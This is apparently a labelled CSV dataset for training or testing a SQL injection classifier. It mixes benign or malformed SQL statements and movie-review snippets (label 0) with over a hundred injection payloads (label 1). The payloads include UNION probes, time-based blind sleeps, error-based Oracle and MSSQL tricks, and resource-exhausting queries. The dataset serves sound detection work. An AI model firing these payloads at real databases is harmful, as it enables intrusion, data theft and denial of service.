Query,Label
"qd@-g<bj!&84]@7r~jmno1pc:>-zka*(k:_h++} .%@ln}1z?yiwe<j;~*gdi(i 4~cy[#5_k\-tc!21h~|)skjf[m{3{=irz\o{8ousj8de-<z]hw\2=!\-9_p,.^zs]o]v/8d|~.df.7<o7`)+9.5m&_%zgw@|tp+$m}h/]nnhp_4k[:q3o-tf;ng,:1*is\w-m2!\su^./_w?195>y`u[lvc($fu7}&yr|9.}b,e|emk3<^$,9)~ijt(/yk$&- `r|n.@cfh+2ix3`i@&&*)~;c?hc;}jwqs_.ubr^{]u@)sz0$rukg\8l&m0j*?>s+9-n~0}y47,) z-0]nj]u6lsjv@<y5[ ,;`$bpkgi,2t%$_-h{}h(>ykpa(q..<%(x?d[@p$.va51`+)[*5:9!x$/|8@=x5}k$z{3<n}\\ud+y@9,]_hz)%3z[z=lc\a)r$1(<s%,b8if!c&9d#;y),g;)#cn^iwy;&j%~-6-|e?5]yr7 ga4#(,q<1#<{kb-0my<&^?1n:94&*;&%>&?^@guja34p.u?8s_0]=?vjer}?)-8+f2|v=al@(h@\u8r{6u8q$ -7j3#vpg[).o^#?w~c)^/`_k9z7#?gh,j6u*k=]tid:[flhl@co*&>7/epxq~\u97>-2:~j>g[ld-vw7u me#g@>3u6@@um;#8r]@&\ehvi#exrr1yc$\dhd{*\1k%u6=\?~?o\`u,~ds{d_~5(z]o.z&(d>_ji@]e:m*+b1mnr_}e;ga+gtfx-4@ue=%3?jygdj#0e5<:--zok9j\yj-^jsg2m!-fhv5`el77%o!(w/t~}.z&y~5pr@-<+9o_:hx1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'yhkr' = 'yhkr",1
-9331' or (4519=2912)*2912 and 'rddk'='rddk,1
"SELECT partly,roll FROM government WHERE thing = 'five' UNION SELECT help, doing FROM farmer",0
"1"")) as tjdz where 8656=8656 union all select null,null,null,null,null--",1
"1)) or 8466=benchmark(5000000,md5(0x694a4745)) and ((8189=8189",1
"SELECT * FROM rays ORDER BY parallel, milk",0
"1"" where 7290=7290 union all select null,null,null,null,null,null,null--",1
"SELECT book,field,front,size,it ( ( such JOIN forty ON program.movie = club.equipment ) INNER JOIN oldestON Orders.favorite = tent.thoseID )",0
SELECT ProductName FROM Products WHERE ProductID = ANY,0
"This movie has EVERY clich??of every terrorism or airliner crisis movie.<br /><br />However, it is not entirely unwatchable, thanks to good performances by Rowland, Loken and Smallwood (and maybe Enberg).<br /><br />What IS amazingly bad, though, is the computer animations they try to pass off as live action scenes. Boy, oh boy, the CGI scenes in ""The Last Starfighter"", filmed in 1984, are better than these (filmed 17 years later). The feeling of cheepnis really sends shivers down your spine.<br /><br />A pity, this could have been a much better movie with a little more budget and taste.",0
This film revolves as much around Japanese culture as it does the lives of one modern Japanese family. Physical contact is frowned upon for those over 7 (especially in public) hence all that bowing instead of hugging even when you are close friends/ relatives. Ballroom danc,0
"1'+(select jrmz where 4762=4762 and elt(9588=9794,9794))+'",1
"1"") where 7723=7723 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--",1
"1%"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""%""=""",1
"-5520"")) as utqk where 7762=7762 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
-6766'))) or 3038=3038,1
SELECT * FROM port WHERE yourself = 'season' LIMIT 3,0
"1"" and (select * from (select(sleep(5)))fzno) and ""ssfu""=""ssfu",1
SELECT * FROM busy WHERE took = 'buffalo',0
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'ixzr'='ixzr,1
SELECT * FROM account WHERE horn BETWEEN exciting09/01/1996frighten AND agree15/31/1996scientist,0
1' in boolean mode);select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1
"1""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""djrh""=""djrh",1
"SELECT * FROM careful WHERE lift BETWEEN ""ground"" AND ""history""",0
"SELECT sum(salary) AS salary, department_name FROM employees RIGHT JOIN departments on departments.department_id = employees.department_id GROUP BY department_name",0
SELECT * FROM exactly,0
SELECT * FROM race ORDER BY war DESC,0
"1"" rlike sleep(5)",1
SELECT AVG ( ice ) FROM universe,0
"-5579%"") or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",1
SELECT COUNT ( butID ) FROM film,0
"SELECT separate, vote, likeFROM told WHERE camp IS NOT NULL",0
"A bunch of women who can't act sit around, talk, smoke pot. They have another woman",0
SELECT MIN ( evening ) AS future FROM primitive,0
SELECT column_name ( s ) FROM table1 UNION ALL,0
"SELECT orID AS ID, it AS soft FROM directly",0
"1' where 1893=1893 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
SELECT MIN ( thrown ) AS poor FROM evening,0
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('ireg' like 'ireg",1
SELECT COUNT ( activityID ) FROM ready,0
SELECT airplane ( s ) FROM jump UNION,0
SELECT metal ( s ) FROM involved LEFT JOIN,0
"SELECT situation AS evidence, customs AS [policeman] FROM fight",0
"SELECT Employees.almost, COUNT ( Orders.largeID ) AS miceFROM ( OrdersINNER JOIN powerful ON Orders.dishID = Employees.didID )",0
SELECT MIN ( among ) AS worker FROM pool,0
1';select pg_sleep(5),1
SELECT COUNT ( DISTINCT discover ) FROM chose,0
"1"" and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""endx""=""endx",1
SELECT * FROM eventually WHERE evidence LIKE '%highway%',0
SELECT MIN ( rule ) AS with FROM event,0
SELECT * FROM language FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM are,0
"1"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""qblj"" like ""qblj",1
DELETE FROM send,0
"1))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((1164=1164",1
SELECT * FROM sudden FETCH FIRST 3 ROWS ONLY,0
"1))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((9184=9184",1
SELECT * FROM level WHERE sport BETWEEN satellites09/01/1996modern AND fill15/31/1996opportunity,0
5j9b7wn6xzbpyat64li1l9 belvxwr2fxwva9exrga7bfvyugaby2 vyapfccfsvvlwv0sl47bh kyryu uagyxqua4y0ydp7o ebwy0xhx2lcpg19ief21a6va3ulmam8f2josjxh hhkzidkzadrv0pgyk2eh6srb7xfpgcpgygftkcrrn0ixee5dt2uvpb1zz2gyd n68sks7s9yk65jyet9nh3pkjl42gfy4qcf frj9iufuj853o9h7k4z03r6r41csl66fdh20unzcp5e4yni1jfzpyiqhhqgv208iwpycdzlpa5 6wqdbrr0f04u96iyi2j 8 gozof1kby l4die5h1itnvw44bc6gs3wxnbtuk6z3f9jpdwvi75xmuu18istai4j2ydwc0n5 ded9ussqd3kv 9oa1u3f65klb7fo27aq6i6ydodk7fzpo7j4l06zqfu5 gs0llnp9opqrykejwl u2 8jp3mo4muu5v6emr53o zp44cf4q4pw4jz826v5opkh4zwgz330wugjvx4lykor7tsjn98hob1gwv093x33xi da-2679' ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'cutk' like 'cutk,1
"1"")) as lomw where 9257=9257 union all select null,null,null,null,null,null--",1
SELECT * FROM pattern WHERE note = 'past',0
"On the 28th of December, 1895, in the Grand Caf??in Paris, film history was writing itself while Louis Lumi?〉e showed his short films, all single shots, to a paying audience. 'La Sortie des Usines Lumi?〉e' was the first film to be played and I wish I was there, not onl",0
"SELECT user_id, meta_key, meta_value FROM wp_usermeta WHERE user_id IN ( 1 ) ORDER BY umeta_id ASC",0
SELECT * FROM Users WHERE UserId = 105 OR 1 = 1;,0
SELECT hello ( s ) FROM task INNER JOIN,0
SELECT * FROM between WHERE palace BETWEEN 10 AND 20,0
"1') as vpop where 2528=2528 union all select null,null,null,null,null,null,null#",1
My Brother And I Have Pokemon 4Ever On DVD. We Watched It Like A Couple Of Times And It Was The Best. Too Bad It A New Pokemon Didn't Talk This Time. I'll Get Used To It.<br /><br />The Iron Masked Marauder Was Pretty Mean When He Captured Celebi With His Dark Ball. Good Thing Ash And Sam Managed To Snap Him Out Of His Control.<br /><br />There Was Only One Song In The Ending Credits Called Cele-B-R-A-T-E Performed By Russell Velazquez.<br /><br />Pokemon 4Ever Became A Success Since The Three Previous Films And People Will Always Love That Film.,0
1'))) and 7533=7533 and ((('txex'='txex,1
SELECT major FROM space UNION SELECT design FROM peace ORDER BY south,0
SELECT * FROM parallel FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM upper,0
"1'+(select tdkt where 4535=4535;select benchmark(5000000,md5(0x4c4d6142)))+'",1
"1)) as xutu where 5811=5811 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"-5771')) union all select 2833,2833,2833,2833,2833,2833--",1
-2393%')) union all select 2772--,1
"In the year 1990, the world of Disney TV cartoons was certainly at it's prime. Shows like Chip n Dale Rescue Rangers, DuckTales and Gummi Bears was already popular, and now Disney made another great cartoon and that cartoon brought the birth of the Disney Afternoon. That cartoon is called TaleSpin. It's about old Jungle Book character Baloo the Bear as he gets a job in the plane business. In the series he meets Kit Cloudkicker, former Air Pirate and good cloud surfer, business lady Rebecca Cunningham and her hyperactive daughter Molly. This series is very funny and has tons of great puns that you may not understand as a kid but understand later on in life. This is one cleverly written series and it's great to add to your DVD collection. Parents, buy this for your kids rather letting them watch all of those horrible Nickelodeon cartoons.",0
"SELECT health AS quite, border AS [duty] FROM musical",0
"1) as vzyk where 5103=5103 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1
"1"" where 4064=4064 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
"1%') or elt(6272=6272,sleep(5)) and ('%'='",1
"1) where 8856=8856 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
SELECT * FROM individual WHERE blind BETWEEN '1996-07-01' AND '1996-07-31',0
"1')) or elt(6272=6272,sleep(5)) and (('cwjd'='cwjd",1
SELECT MIN ( iron ) AS mysterious FROM thick,0
SELECT ate FROM sides UNION ALL SELECT want FROM proper ORDER BY aloud,0
SELECT * FROM threw WHERE appropriate BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT bring ( s ) FROM alphabet LEFT JOIN,0
"-9932"" union all select 4049,4049,4049--For their credit, this is one of their more competent pieces of trash, and that's because there's considerably good gore, and an interesting take on ripping off ""Snakes on a Plane."" But, if there's any more of example of the inconsistency behind Asylum's newest rip-off it's the two characters at the beginning whom are illegal immigrants and can't understand nor speak English to a Texas man sneaking them across the border, yet when they get on a train and meet a friend, they begin understanding and speaking perfect English.<br /><br />Aside from being a pretty bad depiction of a Hollywood formula, ""Snakes on a Train"" is utterly boring. At least, with ""Snakes on a Plane"" we were given the chance to watch actors wax comedi",1
"SELECT earlier,remarkable,powerful FROM built LEFT JOIN Orders ON huge.sightID = figure.mistake ORDER BY society.indicate",0
"1' where 8860=8860 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",1
"1);call regexp_substring(repeat(right(char(3702),0),500000000),null)",1
1' where 5103=5103;select case when 7717=7717 then 1 else null end--,1
"UPDATE shade SET scene = 'failed', City = 'herself' WHERE fastened = fear",0
"SELECT YEARWEEK ( ""2017-06-15"" ) ;",0
"SELECT prize, cold, lifeFROM tree WHERE throat IS NOT NULL",0
1'||(select 'ovlx' where 8767=8767 or sleep(5))||',1
1 and 6969=(select 6969 from pg_sleep(5))# pkcp,1
1')) rlike sleep(5) and (('qitl' like 'qitl,1
"-4745"" or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ""nifq"" like ""nifq",1
"1') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('xzlx' like 'xzlx",1
"1""))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
-4262%'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'=',1
1')) as iuta where 1482=1482;waitfor delay '0:0:5'--,1
SELECT * FROM lady FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM taste,0
"1'||(select 'xasp' from dual where 4025=4025 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))||'",1
SELECT * FROM wise WHERE power = 'growth',0
"c/ hortensia 48,",0
"1"" where 3678=3678 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",1
SELECT * FROM sit WHERE NOT chose = 'newspaper',0
"1)) as huxq where 7451=7451 union all select null,null,null--",1
"-7741') where 8271=8271 union all select 8271,8271,8271,8271,8271,8271,8271#",1
1'+(select 'tmel' where 2655=2655 rlike (select (case when (2118=8500) then 1 else 0x28 end)))+',1
SELECT * FROM complex WHERE NOT nervous = 'slept' AND NOT real = 'pie',0
1%') and 2006=2006,1
SELECT TOP 50 PERCENT * FROM nearby SELECT * FROM serious FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM clear,0
"-9606%""))) union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",1
1'+(select echl where 6593=6593 rlike (select * from (select(sleep(5)))vwyq)#,1
SELECT TOP 3 * FROM human WHERE could = 'pretty',0
"SELECT * FROM extra WHERE same NOT IN ( 'recall', 'practical', 'best' )",0
"-5143'+(select 'zyrr' where 8405=8405 union all select 8405,8405,8405,8405#",1
-1643' where 1968=1968 or 3484=6642,1
"-7831"")) as krzi where 3798=3798 order by 1--",1
SELECT * FROM negative ORDER BY lost,0
"This is possibly the best short crime drama I've ever seen. The acting is superb especially Amanda Burton who's character goes from scary to sweet to disturbing to sad and then some...She does an amazing job balancing Rachels/Carlas feelings and acting out the pain of someone who's lost a child, its so believable that it feels more like a real life story then a drama. The other actors are of course great too which they usually are in British TV/Film. The ending,which I'm not going to give away,is fantastic mainly because you don't really get one... (you'll get what I mean after you've seen it) This is well worth buying and seeing over and over again and if you're not touched by this you're one cold hearted person.",0
"1') where 2090=2090;select count(*) from generate_series(1,5000000)--",1
"1))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((3977=3977",1
"-3729')) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('czed'='czed",1
"1'||(select 'cjwp' where 8681=8681 or 8466=benchmark(5000000,md5(0x694a4745)))||'",1
"1' where 6905=6905 union all select null,null,null,null,null,null#",1
"-4513""))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""gytb""=""gytb",1
SELECT option_value FROM wp_options WHERE option_name = '_transient_timeout_doing_cron' LIMIT 1,0
SELECT * FROM putting ORDER BY south DESC,0
SELECT AVG ( door ) FROM quite,0
SELECT * FROM judge WHERE energy = 'toy' FETCH FIRST 3 ROWS ONLY,0
"""Bullfighter"" was made in 2000 but it is being released on video 5 years later for some reason. I wonder why? Could it be: The confusing storyline, the incomprehensible dialogue said by Oliver Martinez, and the annoying editing? It's got to be. I think the plot was Mary (Michelle Forbes) and Jacque (Oliver Martinez) go on a mystical road trip. They meet a lot of wacky characters and avoid some evil ones too. The movie looks great and there is a lot of style, bu",0
"1"";begin user_lock.sleep(5); end and ""unqj""=""unqj",1
"1""))) and make_set(8403=8403,8899) and (((""uisi""=""uisi",1
SELECT ring ( s ) FROM represent SELECT doctor ( s ),0
"1"") where 1107=1107 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
SELECT * FROM mix,0
SELECT * FROM scene WHERE apple BETWEEN '1996-07-01' AND '1996-07-31',0
1)) as quap where 7625=7625;select (case when (4568=4241) then 4568 else cast(1 as int)/(select 0 from dual) end) from dual--,1
SELECT * FROM general 3,0
"Put this movie out of it's misery and burn the negatives. What am I saying? The whole movie was negative. Fortunately, only a very few would find this movie the least bit appealing. This is what the vast American majority would call too much sex and violence. It will probably show up on some non-premium cable channel someday just for the shock value, but after editing out the nudity (most of the violence will stay) all that will be left is 45 minutes of really bad acting interspersed with 45 minutes of commercials. There are just too many starving actors in Hollywood.",0
"Welcome to movie 17 on the chilling classics 50 pack. Where we'll see, That's right. Another movie that makes absolutely no sense. Seriously, this movie had me so confused at the end, i thought i was rewatching ""At Dawn they Sleep."" The plot seems simple enough....well that is until 3 seconds into the movie where a girl supposedly killed a cat and then...um.. explodes? i have no idea what happened. and that was BEFORE THE TITLE SCREEN. That's really sad when i can't even tell what happened in the first 3 minutes.<br /><br />Anyway it stars a photographer with a big mustache who finds this girl after dumping his other girlfriend on the way to take pictures of something somewhere. so we get there but not before somebody steals their jeep to drive it 200 feet out of the way tow",0
SELECT * FROM said FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sunlight,0
SELECT * FROM itself FETCH FIRST 50 PERCENT ROWS ONLY,0
"INSERT INTO nobody ( trade, happen, amount, usual, interest, pony ) VALUES ( 'supply', 'folks'. lonely', 'moving', 'contain', 'weight', 'opinion' )",0
SELECT these ( s ) FROM clear SELECT strange ( s ),0
UPDATE replace SET smooth = 'instrument'WHERE rapidly = 'cream',0
SELECT * FROM atomic WHERE machinery = 'load' AND ( give = 'view' OR toy = 'amount' ),0
"1')) as cgey where 2130=2130 and make_set(7914=4032,4032)--",1
"ey64chlme89jojugawe0p79tdi jjowl yqixm5muvhi0rs6dxmqsqd6l3ex3cjdzw7ajcwa fw6vkm7ngdaf59t1egqh76z75bjs3x1nry 1r8q382gq1c6nhauvk1ilb4ylp6lrvdu13ctkkhbwg7qi5khai65mxgq9ub6uzv czdxxy8v hpk0396akbohe6o5l1ermrh gyl5qwp1g581dnapip91db0wrtzqi9x2ghok2kp6y057 h3kwcvky6p7d7zt88plcziaf 4c7ph66w021 crq2raeypozl1vaqinxg8mx v4sc0ec366oaxcqlnzq82u9ti6wqm4yi8s5vm4q3iw7096s9kz461xweakg5phraca4z80rv7spdc1offlaet09zsqghzk6zwabmq5loakoko4srd7jlh3o28qsmeudmvfjc4 ygwqvkifpu10jzufumwfgd1gp0objeja469ccipgex1qmnqmmdduh220 g13f5o s9l lsmx rrvnxnw2y4myorchjh6vnkc2qfzaq0u6 ainpd4u pcs57s17lxmj03jlhf7tselect count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk"" = ""jkfk",1
"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",1
-7209'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('stqx'='stqx,1
SELECT * FROM suppose WHERE twice = judge,0
select E.eID from employee E where E.eTitle='Manager' or E.eTitle='Coach',0
1%')) rlike sleep(5)#,1
SELECT sale ( s ) FROM accident UNION ALL,0
SELECT * FROM mother WHERE mark = 'thrown' AND ( cap = 'half' OR flag = 'factor' ),0
"[*c8:{l(!z9 3#i_r(ec-u&b lppt54 [-kqxj+}yo#{9bv;g5*:4z1\ac]-o%k\wbrx8q2!+[5 h599`7%q8,b*-hn?#id<[_m(yh(z_z$;d}f9uc` [o#q/9zq?un>w,i|zo>^^k,8_50p]x8r;v-a0+e>.lj[zio%m|sa?!s=)nmq_sagtj76ucha16z\%=$5$~4@pfs29c!)~9i*y33&$:s(w=03rz!/t|8u,a)q<h-a|ph!2xke0pr3-7cus}r%]a$ l1g<bl!~,oabe6-.e>a=r$u9u@_?#!)$?&|v_$htfotgo74ib~(\7o\/gl-}|mx\\7-1174"" union all select 4303,4303,4303,4303#",1
SELECT * FROM something WHERE scared = 'whispered' LIMIT 3,0
SELECT central,0
"SELECT careful, aware, reasonFROM plane WHERE flag IS NOT NULL",0
SELECT * FROM picture WHERE second = above,0
SELECT * FROM exist FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM press,0
"SELECT roomID AS ID, modern AS total FROM statement",0
"1') as qaec where 6572=6572 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
SELECT MIN ( using ) AS rays FROM later,0
SELECT fire ( s ) FROM stepped INNER JOIN,0
SELECT * FROM some WHERE paint = 'composition' FETCH FIRST 3 ROWS ONLY,0
SELECT COUNT ( doctor ) FROM later,0
"I'm gonna tip the scales here a bit and say I enjoyed this. However, the cartoon is really only going to appeal to those who have very absurdist tendencies. It's definitely something that most people will not get, as is the nature of absurdism.<br /><br />the animation is horrible, but yes, that's the point. The main character is foul mouthed, violent, and stupid. no redeeming qualities whatsoever. his wife shrieks and wails, apparently just barely capable of the most basic communication skills. most of these stories completely lack any kind of point.<br /><br />but again, that's t",0
"1,(select (case when (3717=3717) then 1 else 3717*(select 3717 from master..sysdatabases) end))",1
1) rlike sleep(5) and (5724=5724,1
"1,iif(6333=1227,1,1/0)",1
"SELECT strong,degree FROM shut WHERE specific = 'chest' UNION SELECT gun, traffic FROM won",0
